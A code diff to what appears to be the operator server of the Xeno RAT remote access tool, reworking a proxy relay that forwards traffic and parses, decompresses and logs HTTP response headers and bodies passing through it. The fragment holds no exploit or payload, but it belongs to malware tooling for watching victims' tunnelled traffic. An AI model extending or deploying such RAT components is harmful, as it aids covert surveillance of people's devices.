@@ -2102,10 +2102,11 @@ namespace xeno_rat_server.Forms
                 const int BUF_SIZE = 16 * 1024;
                 var buf = new byte[BUF_SIZE];
 
-                MemoryStream headerBuf = new MemoryStream();
-                MemoryStream fullResponseBuf = new MemoryStream();
-                bool headerLogged = false;
+                MemoryStream headerBuf = isRequest ? null : new MemoryStream();
+                MemoryStream bodyBuf = null;
+                bool headersParsed = false;
                 bool isChunked = false;
+                long? contentLength = null;
                 string contentEncoding = null;
 
                 try
@@ -2120,13 +2121,13 @@ namespace xeno_rat_server.Forms
                         catch (OperationCanceledException) { break; }
                         catch (Exception ex)
                         {
-                            _log($"Pipe {(isRequest ? "C->S" : "S->C")} read error: {ex.Message}");
+                            _log($"{(isRequest ? "C->S" : "S->C")} read error: {ex.Message}");
                             break;
                         }
 
                         if (bytesRead <= 0) break;
 
-                        // Always forward bytes to destination immediately
+                        // Immediately relay bytes
                         try
                         {
                             await dst.WriteAsync(buf, 0, bytesRead, ct).ConfigureAwait(false);
@@ -2134,62 +2135,73 @@ namespace xeno_rat_server.Forms
                         }
                         catch (Exception ex)
                         {
-                            _log($"Pipe {(isRequest ? "C->S" : "S->C")} write error: {ex.Message}");
+                            _log($"{(isRequest ? "C->S" : "S->C")} write error: {ex.Message}");
                             break;
                         }
 
-                        // Capture headers first
-                        if (!headerLogged)
+                        if (isRequest) continue; // Only log responses
+
+                        // Accumulate header until full header found
+                        if (!headersParsed)
                         {
                             headerBuf.Write(buf, 0, bytesRead);
-                            string headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
-                            if (headersText != null)
+                            var headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
+                            if (headersText == null)
+                                continue; // still waiting for more data
+
+                            headersParsed = true;
+                            _log($"HTTP response detected:\n{Truncate(headersText, 1000)}");
+
+                            // Detect encoding and length
+                            var matchLength = Regex.Match(headersText, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
+                            if (matchLength.Success)
+                                contentLength = long.Parse(matchLength.Groups[1].Value);
+
+                            isChunked = headersText.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0;
+
+                            var matchEncoding = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
+                            if (matchEncoding.Success)
+                                contentEncoding = matchEncoding.Groups[1].Value.ToLowerInvariant();
+
+                            // Create new body buffer, copy any remaining bytes
+                            bodyBuf = new MemoryStream();
+                            if (headerBuf.Length > headersLength)
                             {
-                                headerLogged = true;
-                                if (isRequest)
-                                    _log($"HTTP request detected:\n{Truncate(headersText, 1000)}");
-                                else
-                                    _log($"HTTP response detected:\n{Truncate(headersText, 1000)}");
-
-                                // Detect Transfer-Encoding and Content-Encoding
-                                isChunked = headersText.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0;
-
-                                var match = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
-                                if (match.Success) contentEncoding = match.Groups[1].Value.ToLowerInvariant();
+                                headerBuf.Position = headersLength;
+                                await headerBuf.CopyToAsync(bodyBuf).ConfigureAwait(false);
                             }
+
+                            headerBuf.Dispose();
+                            headerBuf = null;
+                        }
+                        else if (bodyBuf != null)
+                        {
+                            bodyBuf.Write(buf, 0, bytesRead);
                         }
 
-                        // For responses, accumulate bytes for logging
-                        if (!isRequest)
-                        {
-                            fullResponseBuf.Write(buf, 0, bytesRead);
-                        }
+                        // Stop reading early if we reached content-length
+                        if (contentLength.HasValue && bodyBuf != null && bodyBuf.Length >= contentLength.Value)
+                            break;
                     }
 
-                    // After loop, decode & log body
-                    if (!isRequest && fullResponseBuf.Length > 0)
+                    // At this point: bodyBuf may have full response
+                    if (!isRequest && bodyBuf != null && bodyBuf.Length > 0)
                     {
-                        fullResponseBuf.Position = 0;
-                        Stream decodeStream = fullResponseBuf;
-
-                        // Wrap in decoder if needed
-                        if (!string.IsNullOrEmpty(contentEncoding))
-                        {
-                            try
-                            {
-                                if (contentEncoding == "gzip") decodeStream = new GZipStream(fullResponseBuf, CompressionMode.Decompress);
-                                else if (contentEncoding == "deflate") decodeStream = new DeflateStream(fullResponseBuf, CompressionMode.Decompress);
-                                else if (contentEncoding == "br") decodeStream = new BrotliStream(fullResponseBuf, CompressionMode.Decompress);
-                            }
-                            catch (Exception ex)
-                            {
-                                _log($"Failed to create decode stream for {contentEncoding}: {ex.Message}");
-                                decodeStream = fullResponseBuf; // fallback: raw bytes
-                            }
-                        }
+                        bodyBuf.Position = 0;
+                        Stream decodeStream = bodyBuf;
 
                         try
                         {
+                            if (!string.IsNullOrEmpty(contentEncoding))
+                            {
+                                if (contentEncoding == "gzip")
+                                    decodeStream = new GZipStream(bodyBuf, CompressionMode.Decompress);
+                                else if (contentEncoding == "deflate")
+                                    decodeStream = new DeflateStream(bodyBuf, CompressionMode.Decompress);
+                                else if (contentEncoding == "br")
+                                    decodeStream = new BrotliSharpLib.BrotliStream(bodyBuf, CompressionMode.Decompress);
+                            }
+
                             using (var reader = new StreamReader(decodeStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true))
                             {
                                 string bodyText = await reader.ReadToEndAsync().ConfigureAwait(false);
@@ -2205,9 +2217,11 @@ namespace xeno_rat_server.Forms
                 }
                 finally
                 {
-                    try { dst.Flush(); } catch { }
+                    try { headerBuf?.Dispose(); } catch { }
+                    try { bodyBuf?.Dispose(); } catch { }
                 }
             }
+
 
             // Returns index length up to and including CRLFCRLF, or -1 if headers not complete
             int TryFindHeadersLength(byte[] data)
